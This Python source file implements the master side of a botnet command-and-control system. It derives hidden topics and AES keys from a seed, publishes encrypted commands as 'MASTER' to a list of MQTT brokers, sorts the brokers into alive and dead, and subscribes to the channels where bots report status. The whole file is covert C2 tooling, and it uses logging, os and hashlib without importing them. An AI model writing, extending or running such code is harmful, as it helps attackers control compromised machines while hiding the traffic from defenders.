import json
import queue
import struct
import threading
from datetime import datetime
import time
import random
from tga_generator import generate_topic
from cipher import *
import string_generator as string_generator
from mqtt import publish_on_broker, subscribe_multitopics_on_broker
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(process)d - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("TGA")

# Constants
BASE_DIR = "dir"
BROKER_DIR = os.path.join(BASE_DIR, "brokers")
SEEDS_DIR = os.path.join(BASE_DIR, "seeds")
TGA_DIR = os.path.join(BASE_DIR, "tga")

os.makedirs(BASE_DIR, exist_ok=True)
os.makedirs(BROKER_DIR, exist_ok=True)
os.makedirs(SEEDS_DIR, exist_ok=True)
os.makedirs(TGA_DIR, exist_ok=True)

client_id_counter = 0
counter_lock = threading.Lock()


def load_file(filename):
    try:
        with open(filename, 'r') as f:
            lines = [line.strip() for line in f.readlines()]
        return lines
    except Exception as e:
        logger.error(f"Failed to load file {filename}: {e}")
        return []

def map_broker_to_command_channel(brokers_file, command_strings_subset, seed):
    brokers = load_file(brokers_file)
    broker_topic_map = {}
    topic_length, topic_level = generate_topic_parameters(seed)
    for broker in brokers:
        random.seed(broker)
        channel_string = random.choice(command_strings_subset)
        logger.info(f"Mapping broker {broker} to channel_string: {channel_string}")
        half = len(channel_string) // 2
        key_seed = channel_string[:half]
        tga_seed = channel_string[half:]
        topic = generate_topic(tga_seed, topic_length, topic_level)
        cipher_key = generate_aes_key_from_seed(key_seed, broker)
        logger.info(f"{broker}:: generated cipher_key: {cipher_key} from key_seed: {key_seed}")
        logger.info(f"{broker}:: generated topic: {topic} from tga_seed: {tga_seed}")

        broker_topic_map[broker] = {
            'cipher_key': cipher_key,
            'topic': topic,
            'channel_string': channel_string
        }
    return broker_topic_map

def listen_to_bots_status(broker, status_from_bot_string, token, seed):
    topic_length, topic_level = generate_topic_parameters(seed)
    output_file = os.path.join(TGA_DIR, "brokers_status_topic_mapping.json")
    try:
        with open(output_file, 'r') as file:
            brokers_status_data = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        brokers_status_data = {}
    # Initialize the broker entry if it doesn't exist
    if broker not in brokers_status_data:
        brokers_status_data[broker] = []
    topics = []
    cipher_keys = {}

    half = len(status_from_bot_string) // 2
    key_seed = status_from_bot_string[:half]
    tga_seed = status_from_bot_string[half:]
    topic = generate_topic(tga_seed, topic_length, topic_level)
    cipher_key = generate_aes_key_from_seed(key_seed, broker)
    logger.info(f"{broker}:: generated cipher_key: {cipher_key} from key_seed: {key_seed}")
    logger.info(f"{broker}:: generated topic: {topic} from tga_seed: {tga_seed}")
    topics.append(topic)
    cipher_keys[topic] = cipher_key
    status_entry = {
        "status_from_bot_string": status_from_bot_string,
        "topic": topic,
        "cipher_key": cipher_key
    }
    brokers_status_data[broker].append(status_entry)
    with open(output_file, 'w') as file:
        json.dump(brokers_status_data, file, indent=4)
    logger.info(f"{broker}, subscribing to topics: {topics}")
    thread = threading.Thread(target=subscribe_multitopics_on_broker,
                              args=(broker, topics, cipher_keys, broker, token,))
    thread.start()

def init_publish(broker, topic, cipher_key, result_queue, seed, status_strings_subset):
    """Initialize publishing on a broker."""
    logger.info(f"Publishing to Broker: {broker}, Topic: {topic}")
    logger.info(f"Topic: {topic}")
    logger.info(f"cipher_key: {cipher_key}")
    random.seed(time.time())
    command_strings_list = list(status_strings_subset)
    random.shuffle(command_strings_list)
    status_from_bot_string = random.choice(command_strings_list)
    token = hashlib.sha256(seed.encode()).hexdigest()
    data = {
        "token": token,
        "type": "CMD",
        "bot_id": "MASTER",
        "status_base_string": status_from_bot_string,
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "msg": "okk",
    }
    alive_file = os.path.join(BROKER_DIR, f"{seed}_alive.txt")
    dead_file = os.path.join(BROKER_DIR, f"{seed}_dead.txt")
    json_string = json.dumps(data)
    encrypted_message = encrypt(cipher_key, json_string)
    if publish_on_broker(broker, topic, encrypted_message, token=token):
        logger.info(f"{broker}: Publish successful for broker {broker}.")
        with open(alive_file, 'a') as file:
            file.write(f"{broker}\n")
        result_queue_data={
            "broker": broker,
            "status_from_bot_string": status_from_bot_string
        }
        result_queue.put(json.dumps(result_queue_data))
    else:
        logger.error(f"{broker}: Publish failed for broker {broker}.")
        with open(dead_file, 'a') as file:
            file.write(f"{broker}\n")


def generate_topic_parameters(seed):
    seed_str = str(seed)
    hash_obj = hashlib.md5(seed_str.encode())
    hash_bytes = hash_obj.digest()
    length_value, level_value = struct.unpack('II', hash_bytes[:8])
    topic_length = 10 + (length_value % 91)
    topic_level = 2 + (level_value % 9)
    return topic_length, topic_level

def start_c2(seed, brokers_file):
    command_strings_subset, status_strings_subset = string_generator.generate_and_split_base_strings(seed)
    topic_length, topic_level = generate_topic_parameters(seed)
    logger.info(f"topic_length: {topic_length}")
    logger.info(f"topic_level: {topic_level}")
    broker_command_channel_map = map_broker_to_command_channel(brokers_file, command_strings_subset, seed)
    result_queue = queue.Queue()
    process_results_thread = threading.Thread(target=process_results_callback, args=(result_queue, status_strings_subset, hashlib.sha256(seed.encode()).hexdigest(), seed))
    process_results_thread.start()
    brokers_data = {}
    for count, (broker, mapping) in enumerate(broker_command_channel_map.items(), start=1):
        brokers_data[broker] = {
            "id": count,
            "channel_string": mapping['channel_string'],
            "topic": mapping['topic'],
            "cipher_key": mapping['cipher_key']
        }
        init_thread = threading.Thread(target=init_publish, args=(broker, mapping['topic'], mapping['cipher_key'], result_queue, seed, status_strings_subset))
        init_thread.start()
    output_file = os.path.join(TGA_DIR, "brokers_command_topic_mapping.json")
    with open(output_file, 'w') as file:
        json.dump(brokers_data, file, indent=4)

def process_results_callback(result_queue, status_strings_subset, token, seed):
    logger.info(
        f"process_results_callback.............:")
    while True:
        try:
            result_queue_data = result_queue.get(timeout=10000)  # Adjust timeout as needed
            result_queue_data_json = json.loads(result_queue_data)
            broker = result_queue_data_json["broker"]
            status_from_bot_string = result_queue_data_json["status_from_bot_string"]
            logger.info(
                f"Processing result.............................................................: {broker}")
            listen_to_bots_status(broker, status_from_bot_string, token, seed)
        except queue.Empty:
            logger.info(
                f"EMPty result...........................................................................: ")
            break